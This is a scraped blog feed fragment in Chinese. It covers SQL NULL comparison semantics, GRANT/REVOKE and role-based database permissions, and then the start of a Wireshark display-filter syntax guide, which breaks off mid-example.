&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;; &lt;span style=&#34;color:#7f848e&#34;&gt;-- 结果为 UNKNOWN
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;; &lt;span style=&#34;color:#7f848e&#34;&gt;-- 结果为 UNKNOWN
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;在查询语句中的处理&#34;&gt;在查询语句中的处理
&lt;/h4&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;在查询语句中，只有使WHERE和HAVING子句的选择条件为TRUE的元组才会被选出作为输出结果（即不包括UNKNOWN的情况)&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;eg1:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;employees&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;salary&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;50000&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;commission&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IS&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这个查询会返回所有工资大于 50000 且佣金不为 NULL 的员工记录&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg2:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;employees&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;commission&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;查询过程中commission可能为NULL，这部分运算后产生UNKNOWN，对应元组会被忽略&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;要让所有都能被输出，最好做如下改动：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;employees&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;commission&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;commission&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IS&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;数据库安全&#34;&gt;数据库安全
&lt;/h2&gt;&lt;h3 id=&#34;授权&#34;&gt;授权
&lt;/h3&gt;&lt;h4 id=&#34;授予用户权限&#34;&gt;授予用户权限
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;GRANT 权限 ON 对象类型 对象名 TO 用户名 [WITH GRANT OPTION];&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;权限：&lt;/strong&gt;&lt;/span&gt;查询权限 SELECT，全部操作权限 ALL PRIVILEGES&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;对象类型：&lt;/strong&gt;&lt;/span&gt;TABLE/VIEW&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;对象名：&lt;/strong&gt;&lt;/span&gt;表和视图的名称&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;用户名：&lt;/strong&gt;&lt;/span&gt;可以指定用户，也可以全体用户PUBLIC&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果没有WITH GRANT OPTION语句，那么用户不能传播这个权限&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SQL不允许循环授权，被授权者不能把权限传递给授权者或其祖先&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.假设我们有一个名为employees的表，现在想让用户user_A只能查询这张表&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;GRANT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ON&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;employees&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;user_A&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果要让A还能把权限授权给别人：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;GRANT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ON&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;employees&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;user_A&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WITH&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;GRANT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OPTION&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;收回用户权限&#34;&gt;收回用户权限
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;REVOKE 权限 ON 对象类型 对象名 FROM 用户名 [CASCADE/RESTRICT];&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CASCADE&lt;/strong&gt;：级联回收，把用户传播出去的权限一并收回&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;RESTRICT&lt;/strong&gt;：受限回收，如果用户传播过该权限，回收会失败（默认行为）&lt;/p&gt;
&lt;p&gt;eg.收回user_A的权限&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;REVOKE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ON&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;employees&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;user_A&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;创建数据库模式的权限&#34;&gt;创建数据库模式的权限
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;对创建数据库模式一类的数据库对象的授权在数据库管理员创建用户的时候实现&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;CREATE USER 用户名 [WITH DBA|RESOURCE|CONNECT];&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DBA&lt;/strong&gt;：可以创建新用户、模式、表、视图等，还可以把这些权限授予其他用户&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;RESOURCE&lt;/strong&gt;：可以创建表、视图，但是不能创建新的模式和用户&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CONNECT&lt;/strong&gt;：只能登录数据库，或者被授予权限后操作&lt;/p&gt;
&lt;h3 id=&#34;数据库角色&#34;&gt;数据库角色
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;角色是权限的集合，可以为一组相同权限的用户创建同一个角色，使用角色管理权限，简化授权过程&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;创建角色&#34;&gt;创建角色
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;CREATE ROLE 角色名;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;给角色添加角色用户&#34;&gt;给角色添加角色/用户
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;GRANT 角色 TO 某角色/某用户 [WITH ADMIN OPTION];&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;给角色授权&#34;&gt;给角色授权
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;GRANT 权限 ON 对象类型 对象名 TO 角色；&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;收回角色权限&#34;&gt;收回角色权限
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;REVOKE 权限 ON 对象类型 对象名 FROM 角色;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>wireshark&amp;tshark简易指北</title>
        <link>https://blog.928330.xyz/p/wiresharktshark%E7%AE%80%E6%98%93%E6%8C%87%E5%8C%97/</link>
        <pubDate>Wed, 14 May 2025 01:15:30 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/wiresharktshark%E7%AE%80%E6%98%93%E6%8C%87%E5%8C%97/</guid>
        <description>&lt;h1 id=&#34;wireshark过滤语法&#34;&gt;wireshark过滤语法
&lt;/h1&gt;&lt;h2 id=&#34;运算符&#34;&gt;运算符
&lt;/h2&gt;&lt;h3 id=&#34;比较运算符&#34;&gt;比较运算符
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;操作符&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;别名&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;类C风格&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;描述&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;示例&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;eq&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;any_eq&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;==&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;等于&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;ip.src == 10.0.0.5&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;ne&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;all_ne&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;!=&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;不等于&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;ip.src != 10.0.0.5&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;all_eq&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;===&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;全等&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;ip.src === 10.0.0.5&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;any_ne&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;!==&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;不全等&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;ip.src !== 10.0.0.5&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;gt&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&amp;gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;大于&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;frame.len &amp;gt; 10&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;lt&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&amp;lt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;小于&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;frame.len &amp;lt; 128&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;ge&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&amp;gt;=&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;大于或等于&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;frame.len ge 0x100&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;le&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&amp;lt;=&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;小于或等于&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;frame.len &amp;lt;= 0x20&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;contains&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;协议、字段或切片包含某个值&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;sip.To contains &amp;ldquo;a1762&amp;rdquo;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;matches&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;~&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;右侧的正则表达式将被用来匹配左侧的字符串&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;http.host matches &amp;ldquo;acme.(org|com|net)&amp;rdquo;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;span style=&#34;font-size:20px;color:red&#34;&gt;&lt;strong&gt;等于（==）和全等（===）的区别：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;== 是一种宽松的比较，只要有一个值匹配即可（any if more than one）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;=== 是一种严格的比较，所有可能的值都必须匹配（all if more than one）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;同一个包，使用等于（==）可以过滤出源或目的端口为80报文，使用全等（===）则会匹配源目的端口都为80的报文&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip.addr &lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt; 10.0.0.0/8    等价于   ip.src&lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt;10.0.0.0/8 &lt;span style=&#34;color:#56b6c2&#34;&gt;||&lt;/span&gt; ip.dst&lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt;10.0.0.0/8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip.addr &lt;span style=&#34;color:#56b6c2&#34;&gt;===&lt;/span&gt; 10.0.0.0/8    等价于   ip.src&lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt;10.0.0.0/8 &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ip.dst&lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt;10.0.0.0/8
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;逻辑运算符&#34;&gt;逻辑运算符
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;操作符&lt;/th&gt;
          &lt;th&gt;类C风格&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
          &lt;th&gt;示例&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;and&lt;/td&gt;
          &lt;td&gt;&amp;amp;&amp;amp;&lt;/td&gt;
          &lt;td&gt;逻辑与&lt;/td&gt;
          &lt;td&gt;ip.src == 10.0.0.5 &lt;strong&gt;and&lt;/strong&gt; tcp.flags.fin == 1&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;or&lt;/td&gt;
          &lt;td&gt;||&lt;/td&gt;
          &lt;td&gt;逻辑或&lt;/td&gt;
          &lt;td&gt;ip.src == 10.0.0.5 &lt;strong&gt;or&lt;/strong&gt; ip.src == 192.1.1.1&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;xor&lt;/td&gt;
          &lt;td&gt;^^&lt;/td&gt;
          &lt;td&gt;逻辑异或，能且只能满足其中一个&lt;/td&gt;
          &lt;td&gt;tr.dst[0:3] == 0.6.29 &lt;strong&gt;xor&lt;/strong&gt; tr.src[0:3] == 0.6.29&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;not&lt;/td&gt;
          &lt;td&gt;!&lt;/td&gt;
          &lt;td&gt;逻辑非&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;!&lt;/strong&gt; udp&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;[…]&lt;/td&gt;
          &lt;td&gt;不涉及&lt;/td&gt;
          &lt;td&gt;[a:b]：从第a个字符开始取b个字符&lt;/td&gt;
          &lt;td&gt;http.request.method**[0:3]**==&amp;ldquo;GET&amp;rdquo;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;in&lt;/td&gt;
          &lt;td&gt;不涉及&lt;/td&gt;
          &lt;td&gt;匹配集合内的元素，代替==&lt;/td&gt;
          &lt;td&gt;http.request.method &lt;strong&gt;in&lt;/strong&gt; {&amp;ldquo;HEAD&amp;rdquo;, &amp;ldquo;GET&amp;rdquo;}&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;函数&#34;&gt;函数
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;函数&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;upper&lt;/td&gt;
          &lt;td&gt;将字符串字段转换为大写&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;lower&lt;/td&gt;
          &lt;td&gt;将字符串字段转换为小写&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;len&lt;/td&gt;
          &lt;td&gt;返回字符串字段或字节字段的字节长度&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;count&lt;/td&gt;
          &lt;td&gt;返回帧中字段的出现次数&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;string&lt;/td&gt;
          &lt;td&gt;将非字符串字段转换为字符串&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;vals&lt;/td&gt;
          &lt;td&gt;将字段值转换为其值字符串（如果有）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;dec&lt;/td&gt;
          &lt;td&gt;将无符号整数字段转换为十进制字符串&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;hex&lt;/td&gt;
          &lt;td&gt;将无符号整数字段转换为十六进制字符串&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;max&lt;/td&gt;
          &lt;td&gt;返回参数的最大值&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;min&lt;/td&gt;
          &lt;td&gt;返回参数的最小值&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;abs&lt;/td&gt;
          &lt;td&gt;返回参数的绝对值&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;upperlower&#34;&gt;upper()、lower()
&lt;/h3&gt;&lt;p&gt;可以使用这两个函数，将字符串转化为大小写，再进行正则匹配，做到不区分大小写的功能&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lower&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;http.server&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; ~ &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;apache&amp;#34;&lt;/span&gt;  //过滤HTTP响应头的server字段为apache的
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;upper&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;http.request.method&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; ~ &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;post|get&amp;#34;&lt;/span&gt;  //过滤http请求方法为POST或GET
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;len&#34;&gt;len()
&lt;/h3&gt;&lt;p&gt;len()函数将返回字段的字节大小，因此可以和比较操作符配合使用，过滤某个报文字段符合大小要求的报文&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;len&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;http.request.uri&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; &amp;gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;10&lt;/span&gt;   //过滤http头部的URI字段，大于等于10字节的报文
